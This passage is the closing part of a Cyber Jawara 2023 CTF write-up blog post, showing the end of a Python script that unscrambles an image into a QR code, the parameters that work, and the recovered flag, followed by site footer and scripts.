</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">22</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">scrambled</span> <span class="o">=</span> <span class="n">unmix</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">scrambled</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ori_arr</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">scrambled</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">bool</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ori_arr</span> <span class="o">=</span> <span class="n">rescale</span><span class="p">(</span><span class="n">ori_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">fromarray</span><span class="p">(</span><span class="n">ori_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;result/</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s1">-</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s1">-flag.png&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Saved to: result/</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s1">-</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s1">-flag.png&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After running the script for a while, parameters $a=10$ and $b=18$ produce the correct QRCode image.</p>
<img src="https://i.imgur.com/5zRAFdt.png"/>
<blockquote>
<p><strong>Flag: CJ2023{small_exercise_to_start_your_day_:D}</strong></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/cyber-jawara-2023/" data-title="Cyber Jawara 2023 Writeup" data-via="Chovid99" data-hashtags="Writeup,Cyber Jawara,2023,pwn,heap,tcache,fastbin dup,OOB,ROP,arm32,crypto,web"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/cyber-jawara-2023/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/cyber-jawara/">Cyber Jawara</a>,&nbsp;<a href="/tags/2023/">2023</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/heap/">Heap</a>,&nbsp;<a href="/tags/tcache/">Tcache</a>,&nbsp;<a href="/tags/fastbin-dup/">Fastbin Dup</a>,&nbsp;<a href="/tags/oob/">Oob</a>,&nbsp;<a href="/tags/rop/">ROP</a>,&nbsp;<a href="/tags/arm32/">Arm32</a>,&nbsp;<a href="/tags/crypto/">Crypto</a>,&nbsp;<a href="/tags/web/">Web</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/tcp1p-ctf-2023/" class="prev" rel="prev" title="TCP1P CTF 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>TCP1P CTF 2023</a>
            <a href="/posts/0ctf-tctf-2023/" class="next" rel="next" title="0CTF/TCTF 2023">0CTF/TCTF 2023<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
